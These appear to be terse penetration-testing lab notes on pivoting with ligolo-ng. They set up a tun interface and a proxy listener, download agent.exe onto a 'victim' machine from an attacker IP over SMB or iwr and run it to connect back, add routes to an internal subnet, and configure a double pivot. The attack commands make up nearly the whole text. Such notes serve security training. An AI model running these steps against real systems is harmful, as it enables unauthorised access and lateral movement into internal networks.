```
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up 
```

```
./lin-proxy -selfcert -laddr 0.0.0.0:443    
```

on victim

```
net use n: \\192.168.45.240\share /user:test test

copy \\192.168.45.240\share\agent.exe
```

```
iwr http://192.168.45.216/agent.exe -O agent.exe
```

```
.\agent.exe -connect 192.168.45.216:443 -ignore-cert
```


add ip route to ligolo
```
sudo ip route add 172.16.182.0/24 dev ligolo
```


in ligolo
```
session
1
start
```

# double pivot

add new interface

```
sudo ip tuntap add user kali mode tun ligolo1
sudo ip link set ligolo1 up
```

add new listener to proxy

```
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:443
```

now after getting connection, start new interface

```
start --tun ligolo1
```